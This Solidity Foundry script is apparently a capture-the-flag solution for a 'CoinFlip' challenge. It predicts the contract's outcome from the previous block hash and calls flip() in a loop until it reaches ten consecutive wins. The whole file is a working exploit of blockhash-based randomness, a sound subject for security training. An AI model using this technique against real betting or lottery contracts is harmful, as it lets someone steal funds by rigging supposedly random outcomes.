//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../src/CoinFlip.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract CoinFlipSolution is Script {
    CoinFlip public coinflipInstance = CoinFlip(0xcf55ff22ab6417d196A3AE81C3073A33aA310037);
    uint constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function callFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinflipInstance.flip(side);
    }

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        while (coinflipInstance.consecutiveWins() < 10) {

            callFlip();
            console.log("No.of wins: ", coinflipInstance.consecutiveWins());
            // Move to next block (Anvil only)
            vm.roll(block.number + 1);
        }
        vm.stopBroadcast();
    }
}